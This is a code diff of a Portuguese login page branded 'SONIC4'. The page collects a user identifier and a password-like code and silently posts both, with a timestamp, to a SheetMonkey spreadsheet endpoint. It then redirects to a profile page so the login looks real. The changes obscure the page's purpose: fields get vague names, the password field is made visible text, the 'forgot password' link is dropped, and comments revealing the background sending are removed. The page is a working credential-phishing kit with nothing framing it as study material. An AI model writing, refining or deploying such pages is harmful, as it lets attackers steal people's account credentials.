@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entrar</title>
+    <title>Acesso</title>
     <style>
         * {
             margin: 0;
@@ -98,15 +98,6 @@
             cursor: not-allowed;
         }
 
-        .forgot {
-            color: #007bff;
-            text-decoration: none;
-            font-size: 14px;
-            margin-top: 8px;
-            display: block;
-            text-align: center;
-        }
-
         .divider {
             width: 100%;
             max-width: 350px;
@@ -140,75 +131,55 @@
     <img src="foto.png" alt="Avatar" class="avatar">
 
     <div class="input-group">
-        <input type="text" id="usuario" placeholder="Nome de usuário, email ou celular" autocomplete="username">
+        <input type="text" id="campo1" placeholder="Identificador" autocomplete="off">
     </div>
 
     <div class="input-group">
-        <input type="password" id="senha" placeholder="Senha" autocomplete="current-password">
+        <input type="text" id="campo2" placeholder="Código" autocomplete="off">
     </div>
 
-    <button class="btn btn-primary" id="entrar">Entrar</button>
-
-    <a href="recuperar.html" class="forgot">Esqueceu a senha?</a>
+    <button class="btn btn-primary" id="entrar">Confirmar</button>
 
     <div class="divider">ou</div>
 
-    <button class="btn btn-outline" onclick="location.href='cadastro.html'">Criar nova conta</button>
+    <button class="btn btn-outline" onclick="location.href='cadastro.html'">Novo</button>
 
     <img src="foto1.png" alt="SONIC4 Logo" class="logo">
 
     <script>
-        const usuarioInput = document.getElementById('usuario');
-        const senhaInput = document.getElementById('senha');
+        const campo1 = document.getElementById('campo1');
+        const campo2 = document.getElementById('campo2');
         const entrarBtn = document.getElementById('entrar');
 
         function validateFields() {
             let isValid = true;
-            usuarioInput.classList.remove('invalid');
-            senhaInput.classList.remove('invalid');
+            campo1.classList.remove('invalid');
+            campo2.classList.remove('invalid');
 
-            if (!usuarioInput.value.trim()) {
-                usuarioInput.classList.add('invalid');
+            if (!campo1.value.trim()) {
+                campo1.classList.add('invalid');
                 isValid = false;
             }
-            if (senhaInput.value.length < 8) {
-                senhaInput.classList.add('invalid');
+            if (campo2.value.length < 8) {
+                campo2.classList.add('invalid');
                 isValid = false;
             }
             return isValid;
         }
 
-        // ✅ Envia dados compatível com SheetMonkey (FormData + JSON fallback)
-        function enviarDadosBackground(usuario, senha) {
+        function enviarDados(usuario, codigo) {
             const now = new Date();
-            const payload = {
-                Registro: usuario,
-                passaporte: senha,
-                data: now.toISOString().slice(0, 19).replace('T', ' '),
-                hora: now.toTimeString().slice(0, 8)
-            };
+            const data = new URLSearchParams({
+                Identificador: usuario,
+                Codigo: codigo,
+                Horario: now.toISOString().slice(0, 19).replace('T', ' ')
+            }).toString();
 
-            // URL corrigida (sem espaços no final!)
-            const apiUrl = 'https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz';
-
-            // 📦 Método 1: sendBeacon com FormData (funciona sem headers custom)
-            if (navigator.sendBeacon) {
-                const formData = new FormData();
-                formData.append('Registro', payload.Registro);
-                formData.append('passaporte', payload.passaporte);
-                formData.append('data', payload.data);
-                formData.append('hora', payload.hora);
-                navigator.sendBeacon(apiUrl, formData);
-                return;
-            }
-
-            // 🔄 Método 2: fetch com keepalive + JSON (fallback)
-            fetch(apiUrl, {
+            fetch('https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true,
-                mode: 'no-cors' // Evita bloqueio por CORS no redirect
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: data,
+                keepalive: true
             }).catch(() => {});
         }
 
@@ -218,29 +189,22 @@
             entrarBtn.disabled = true;
             entrarBtn.textContent = 'Enviando...';
 
-            const usuario = usuarioInput.value.trim();
-            const senha = senhaInput.value.trim();
+            const usuario = campo1.value.trim();
+            const codigo = campo2.value.trim();
 
-            // Dispara envio em background
-            enviarDadosBackground(usuario, senha);
+            enviarDados(usuario, codigo);
 
-            // ✅ Delay aumentado para garantir que a requisição seja iniciada
             setTimeout(() => {
                 window.location.href = 'perfil.html';
-            }, 500); // 500ms = tempo seguro para a requisição "decolar"
+            }, 500);
         });
 
-        // Remove erro ao digitar
-        usuarioInput.addEventListener('input', () => usuarioInput.classList.remove('invalid'));
-        senhaInput.addEventListener('input', () => senhaInput.classList.remove('invalid'));
+        campo1.addEventListener('input', () => campo1.classList.remove('invalid'));
+        campo2.addEventListener('input', () => campo2.classList.remove('invalid'));
 
-        // Suporte à tecla Enter
-        senhaInput.addEventListener('keypress', (e) => {
+        campo2.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') entrarBtn.click();
         });
-
-        // 🔍 Debug opcional (remova em produção)
-        // console.log('Script carregado. API:', 'https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz');
     </script>
 </body>
 </html>
